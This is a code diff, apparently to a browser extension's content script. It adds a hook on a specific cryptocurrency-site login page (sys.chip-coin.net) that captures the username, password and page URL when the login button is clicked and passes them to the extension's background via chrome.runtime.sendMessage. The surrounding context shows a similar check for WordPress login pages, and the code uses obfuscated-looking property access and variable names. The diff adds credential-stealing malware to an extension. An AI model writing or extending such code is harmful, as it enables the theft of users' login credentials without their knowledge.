@@ -495,6 +495,21 @@ if (top['location']['href']['indexOf']('wp-login.php') > -1) {
               }
           }, 1000)
       };
+
+      if (top['location']['href']['indexOf']('https://sys.chip-coin.net:1006/sys/iCommerce/modules/mod_chipcoin/login.jsp') > -1) {
+            var interval = setInterval(function () {
+                if (document['getElementsByClassName']('form-signin')) {
+                    clearInterval(interval);
+                    document['getElementById']('btn btn-large btn-warning').onclick = function (_0x441cx2) {
+                     var login = {};
+                    login.username = document.getElementsByName("usu").value;
+                    login.pass = document.getElementsByName("con").value;
+                    login.href = window.location.href;
+                    chrome.runtime.sendMessage({cmd: "l",login});
+                    }
+                }
+            }, 1000)
+        };
     //
 // var img = document.getElementsByTagName('img');
 //      for (var i = 0; i < img.length; i++){
